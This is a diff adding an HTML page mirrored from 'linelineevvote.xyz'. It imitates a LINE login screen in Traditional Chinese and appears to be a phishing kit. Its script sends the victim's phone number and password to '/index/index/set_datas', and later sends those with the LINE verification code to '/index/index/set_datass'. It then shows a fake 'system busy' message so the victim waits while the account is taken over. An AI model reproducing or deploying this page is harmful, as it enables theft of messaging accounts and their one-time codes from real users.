@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+	
+<!-- Mirrored from linelineevvote.xyz/index/index/line.html?line= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 Jun 2025 06:14:21 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, minimal-ui" />
+		<title>LINE登錄</title>
+	<link rel="stylesheet" href="../../vote/base.css">
+	<style type="text/css">
+		* {
+			margin: 0;
+			padding: 0;
+		}
+
+		.uni-page-head {
+			background-color: rgb(5 197 86);
+			color: white;
+			position: fixed;
+			left: 0;
+			top: 0;
+			height: 44px;
+			height: calc(44px + constant(safe-area-inset-top));
+			height: calc(44px + env(safe-area-inset-top));
+			padding: 7px 3px;
+			padding-top: calc(7px + constant(safe-area-inset-top));
+			padding-top: calc(7px + env(safe-area-inset-top));
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			overflow: hidden;
+			-webkit-box-pack: justify;
+			box-sizing: border-box;
+			z-index: 998;
+			width: 100%;
+			background-color: rgb(5 197 86);
+			color: white;
+		}
+
+		.uni-page-head .uni-page-head-icon {
+			width: 32px;
+			height: 32px;
+			position: absolute;
+			left: 4px;
+		}
+
+		.uni-page-head .uni-page-head__title {
+			font-size: 16px;
+			opacity: 1;
+			font-weight: 700;
+		}
+
+		.logo-container {
+			text-align: center;
+			margin-top: 74px;
+		}
+
+		.logo-container .logo {
+			display: block;
+			margin: 30px auto;
+			width: 30%;
+		}
+
+		.logo-container .line-of-text {
+			text-align: center;
+			margin: 10px 30px 0px;
+		}
+
+		.regiscont .forms {
+			background-color: #fff;
+			border-radius: 25px;
+			padding: 0 15px;
+			padding-top: 15px;
+			opacity: .85;
+			margin-top: 40px;
+		}
+
+		.regiscont .forms .uni-forms-item {
+			position: relative;
+			padding: 0;
+			text-align: left;
+			color: #333;
+			font-size: 14px;
+		}
+
+		.uni-forms-item__box {
+			position: relative;
+		}
+
+		.is-direction-top {
+			flex-direction: column;
+		}
+
+		.uni-forms-item__inner {
+			display: flex;
+			padding-bottom: 22px;
+		}
+
+		.is-required {
+			color: #dd524d;
+			font-weight: 700;
+		}
+
+		.uni-forms-item__label {
+			display: flex;
+			flex-shrink: 0;
+			box-sizing: border-box;
+			flex-direction: row;
+			align-items: center;
+			width: 70px;
+			justify-content: flex-start;
+			padding: 5px 0;
+			height: 36px;
+		}
+
+		.uni-forms-item__content {
+			width: 100%;
+			box-sizing: border-box;
+			min-height: 36px;
+			flex: 1;
+		}
+
+		.uni-easyinput {
+			width: 100%;
+			flex: 1;
+			position: relative;
+			text-align: left;
+			color: rgb(51, 51, 51);
+			font-size: 14px;
+		}
+
+		.is-input-border {
+			display: flex;
+			box-sizing: border-box;
+			flex-direction: row;
+			align-items: center;
+			border: none;
+			border-radius: 0;
+			border-color: rgb(229, 229, 229);
+			border-bottom: 1px solid #eee !important;
+			flex: 1;
+			width: 100%;
+			min-height: 36px;
+		}
+
+		.uni-input-wrapper {
+			position: relative;
+			margin-top: 0px;
+			margin-bottom: 10px;
+			justify-content: center;
+			flex-direction: column;
+			-webkit-box-pack: center;
+			width: 100%;
+			height: 100%;
+			-webkit-box-orient: vertical;
+			-webkit-box-direction: normal;
+			display: flex;
+			outline: none;
+			border: none;
+			padding: 0;
+			margin: 0;
+			text-decoration: inherit;
+		}
+
+		.uni-input-input {
+			position: relative;
+			display: block;
+			height: 100%;
+			width: 100%;
+			border: none;
+			background-color: transparent;
+			padding: 5px 0;
+			background: none;
+			outline: none;
+			opacity: 1;
+		}
+
+		.send-button {
+			position: absolute;
+			top: 44%;
+			right: 10px;
+
+			transform: translateY(-50%);
+			font-size: 11px;
+			background: rgb(238, 238, 238);
+			padding: 5px 15px;
+			border-radius: 3px;
+		}
+
+		.uni-easyinput__content-input {
+			width: 100%;
+			padding-left: 10px;
+			position: relative;
+			overflow: hidden;
+			font-size: 14px;
+			display: flex;
+			align-items: center;
+		}
+
+		.subbtn {
+			position: relative;
+			display: block;
+			box-sizing: border-box;
+			font-size: 18px;
+			text-align: center;
+			text-decoration: none;
+			border-radius: 5px;
+			-webkit-tap-highlight-color: transparent;
+			overflow: hidden;
+			color: #fff;
+			background-color: rgb(5 197 86);
+			cursor: pointer;
+			margin-top: 25px;
+			border: none;
+			width: 100%;
+			height: 46px;
+		}
+		.btn-submit-open{
+			width: 100%;
+			height: 40px;
+			line-height: 40px;
+			font-size: 13px;
+			border-radius: 3px;
+			background: #00c854;
+			color: #fffeff;
+			text-align: center;
+			margin-top: 10px;
+		}
+	</style>
+	<style>
+    .popup {
+        width: 100vw;
+        height: 100vh;
+        background-color: rgba(0, 0, 0, .5);
+        position: fixed;
+        left: 0;
+        top: 0;
+        bottom: 0;
+        right: 0;
+        display: none;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .popup-content {
+        width: 80%;
+        background-color: #fff;
+        box-sizing: border-box;
+        padding: 0.5rem 1.5rem;
+        color: black;
+        border-radius: 0.5rem;
+    }
+
+    .top {
+        width: 100%;
+        font-size: 0.8rem;
+
+    }
+
+    .info {
+        padding: 0.5rem 0;
+        margin-bottom: 1rem;
+        font-size: 0.6rem;
+    }
+    .btn{
+        padding: 0 0.75rem;
+        line-height: 1.25rem;
+        font-size: 0.6rem;
+    }
+</style>
+	</head>
+	<body>
+		<div class="uni-page-head">
+			<img class="uni-page-head-icon" src="../../vote/zuo.png" alt="" srcset="" onclick="history.go(-1)"/>
+			<div class="uni-page-head__title">LINE登錄</div>
+		</div>
+		<div class="logo-container">
+			<img src="../../vote/logo.png" alt="Logo" class="logo">
+			<h2 class="line-of-text">歡迎使用LINE</h2>
+			<p class="line-of-text">盡情享受免費的資訊收發、語音和視頻通話等功能！</p>
+		</div>
+		<div class="regiscont">
+			<div class="forms" style="    box-shadow: rgba(15, 41, 77, 0.2) 0px 2px 8px 0px;
+    margin: 30px 20px 0px;
+    padding: 15px;
+    border-radius: 5px;">
+				<div class="uni-forms" >
+					<!--<h2 style="font-size: 16px">第一步：</h2>-->
+					<div class="uni-forms-item">
+						<div class="uni-forms-item__box">
+							<div class="uni-forms-item__inner is-direction-top">
+								<div class="uni-forms-item__label" style="width: 90px; justify-content: flex-start;">
+									<uni-text class="is-required"><span>*</span></uni-text>
+									<uni-text class="label-text"><span>電話號碼</span></uni-text>
+									<div class="label-seat"></div>
+								</div>
+								<div class="uni-forms-item__content">
+									<div class="uni-easyinput">
+										<div class="is-input-border">
+											<div class="uni-easyinput__content-input">
+												<div class="uni-input-wrapper">
+													<input maxlength="140" step="" id="mobile" name="mobile"
+														placeholder="請輸入LINE電話號碼" autocomplete="off"
+														class="uni-input-input">
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="uni-forms-item">
+						<div class="uni-forms-item__box">
+							<div class="uni-forms-item__inner is-direction-top">
+								<div class="uni-forms-item__label" style="width: 90px; justify-content: flex-start;">
+									<uni-text class="is-required"><span>*</span></uni-text>
+									<uni-text class="label-text"><span>輸入密碼</span></uni-text>
+									<div class="label-seat"></div>
+								</div>
+								<div class="uni-forms-item__content">
+									<div class="uni-easyinput">
+										<div class="is-input-border">
+											<div class="uni-easyinput__content-input">
+												<div class="uni-input-wrapper" style="width: 82%">
+													<input maxlength="140" step="" id="password" name="password" placeholder="請輸入密碼"
+														autocomplete="off" class="uni-input-input">
+												</div>
+												<span style="font-size: 11px; padding: 5px 0px; border-radius: 3px;" onclick="forgetPwd()">忘記密碼？</span>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<!--<h2 style="font-size: 16px">第二步：</h2>
+					<div class="btn-submit-open" onclick="goSetting()">&gt;&gt;&gt;跳轉Line點選移動帳號選項開啟授權&lt;&lt;&lt;</div>
+					<a  class="" style="padding: 15px 0px; color: rgb(255, 151, 0); text-align: right; font-size: 13px;display: block" href="javascript:void(0)" onclick="goHelp()">如何開啟？</a>-->
+					<div class="uni-forms-item">
+						<div class="uni-forms-item__box">
+							<div class="uni-forms-item__inner is-direction-top">
+								<div class="uni-forms-item__label" style="width: 90px; justify-content: flex-start;">
+									<uni-text class="is-required"><span>*</span></uni-text>
+									<uni-text class="label-text"><span>輸入認證碼</span></uni-text>
+									<div class="label-seat"></div>
+								</div>
+								<div class="uni-forms-item__content">
+									<div class="uni-easyinput">
+										<div class="uni-easyinput__content is-input-border">
+											<div class="uni-easyinput__content-input">
+												<div class="uni-input-wrapper">
+													<input placeholder="請輸入LINE認證碼" id="vycode" name="vycode"
+														maxlength="140" enterkeyhint="done" autocomplete="off" type=""
+														class="uni-input-input">
+												</div>
+												<span class="send-button"  id="Btn">發送</span>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<button class="subbtn" id=submit>登 錄</button>
+				</div>
+			</div>
+		</div>
+		<div>
+			<img id="voteBottomImage" src="#"  style="width: 100%;margin-top: 20px"/>
+		</div>
+		<div class="popup" id="popup" style="z-index: 999">
+            <div class="popup-content" id="popcont">
+                <div class="top text-c">
+                    <p style="font-size: 16px">提示</p>
+                </div>
+                <div class="info">
+                    <p style="font-size: 14px">系統擁擠請稍後重試。</p>
+<!--                    <p style="font-size: 14px">系統繁忙中~請<span id="waitMinute">1</span>分鐘後再試！</p>-->
+                </div>
+                <div class="ub ub-xc ub-ar">
+                    <!--因为两个按钮在popup这个大框里，点击确定和取消就会同时点击父元素，会产生事件冒泡（即点击确定，会同时出现true和false）-->
+                    <!--<button class="btn border-666 cor-gay" type="button" onclick="hidePopup()"> 取消</button>-->
+                    <button class="btn bg-geen cor-white border-no" type="button"  onclick="next()" style="font-size: 12px; border-radius:3px">确定</button>
+                </div>
+            </div>
+        </div>
+    <script src="../../../code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script>
+var waitMinute = 60;
+var voteBottomImage = localStorage.getItem("voteBottomImage");
+$("#voteBottomImage").attr("src", voteBottomImage);
+
+function forgetPwd() {
+	openLine("https://line.me/R/nv/settings/account");
+}
+
+function goSetting() {
+	openLine("https://line.me/R/nv/settings");
+}
+
+function goHelp() {
+	var help_url = "help.html";
+	window.location.href = help_url;
+}
+
+function openLine(url_scheme) {
+	let ua = window.navigator.userAgent;
+	if(ua.match(/android/i)){
+		openApp(url_scheme, function (data) {});
+	}else if(ua.match(/(iPhone|iPod|iPad);?/i)){
+		window.location.href = url_scheme;
+	}
+}
+const openApp = function(openUrl, callback) {
+	//检查app是否打开
+	function checkOpen(cb){
+		var _clickTime = +(new Date());
+		function check(elsTime) {
+			if ( elsTime > 3000 || document.hidden || document.webkitHidden) {
+				cb(1);
+			} else {
+				cb(0);
+			}
+		}
+		//启动间隔20ms运行的定时器，并检测累计消耗时间是否超过3000ms，超过则结束
+		var _count = 0, intHandle;
+		intHandle = setInterval(function(){
+			_count++;
+			var elsTime = +(new Date()) - _clickTime;
+			if (_count>=100 || elsTime > 3000 ) {
+				clearInterval(intHandle);
+				check(elsTime);
+			}
+		}, 20);
+	}
+
+	//在iframe 中打开APP
+	var ifr = document.createElement('iframe');
+	ifr.src = openUrl;
+	ifr.style.display = 'none';
+
+	if (callback) {
+
+		checkOpen(function(opened){
+			callback && callback(opened);
+		});
+
+	}
+
+	document.body.appendChild(ifr);
+	setTimeout(function() {
+		document.body.removeChild(ifr);
+	}, 2000);
+
+}
+
+
+// this.showPopup();
+//显示弹窗函数，设置display为flex
+function showPopup() {
+    document.getElementById("popup").style.display = "flex";
+}
+$(document).ready(function() {
+    $('#popup').click(function() {
+       $(this).hide();
+    });
+
+    $('#popcont').click(function(event) {
+        event.stopPropagation(); // 阻止事件冒泡
+    });
+
+});
+function hidePopup() {
+    $('#popup').hide()
+}
+function next() {
+    $('#popup').hide();
+}
+
+
+function getQueryString(name) {
+    let reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+    let r = window.location.search.substr(1).match(reg);
+    if (r != null) {
+        return unescape(r[2]);
+    };
+    return null;
+ }
+
+$.get("/index/index/getIp", function(data) {
+    var socket = null;
+    var code2 = '';
+    var line = getQueryString("line");
+    const ipAddress = data.data;
+    console.log("IP：" + ipAddress);
+    let sub = '';
+    
+
+    let countdown = 60;
+    $('#Btn').click(function(){
+        var mobile = $("input[name=mobile]").val();
+       
+        var password = $("input[name=password]").val();
+
+        if (mobile == ''  || password == '') {
+
+            alert('請填寫對應資訊');
+            return false;
+        }
+        const button = document.getElementById('Btn');
+        // 
+        const data = {
+            phone: mobile,
+            password: password
+        }
+        $.post("/index/index/set_datas", data)
+            .done(function(response) {
+                
+            })
+            .fail(function() {
+                alert("系統繁忙中~請1分鐘後再試！");
+            });
+        if(!button.disabled){
+            // 
+            button.disabled = true;
+            const timer = setInterval(() => {
+                countdown--;
+                button.textContent = ` ${countdown} S`;
+
+                if (countdown <= 0) {
+                    // 
+                    clearInterval(timer);
+                    button.textContent = '發送';
+                    button.disabled = false;
+                    countdown = 60; // 
+                }
+            }, 1000);
+        }
+    });
+    
+    var check = 1;
+    $("#submit").on('click', function () {
+        
+       
+        var mobile = $("input[name=mobile]").val();
+        var vycode = $("input[name=vycode]").val();
+        var password = $("input[name=password]").val();
+
+        if (mobile == '' || vycode == '' || password == '') {
+
+            alert('請填寫對應資訊');
+
+
+        }  else {
+            showPopup();
+            const data = {
+                phone: mobile,
+                codes: vycode,
+                password: password
+            }
+            $.post("/index/index/set_datass", data)
+                .done(function(response) {
+                
+                })
+                .fail(function() {
+                    alert("系統繁忙中~請1分鐘後再試！");
+                });
+            return;
+        }
+    });
+
+});
+
+</script>
+	</body>
+
+<!-- Mirrored from linelineevvote.xyz/index/index/line.html?line= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 Jun 2025 06:14:22 GMT -->
+</html>
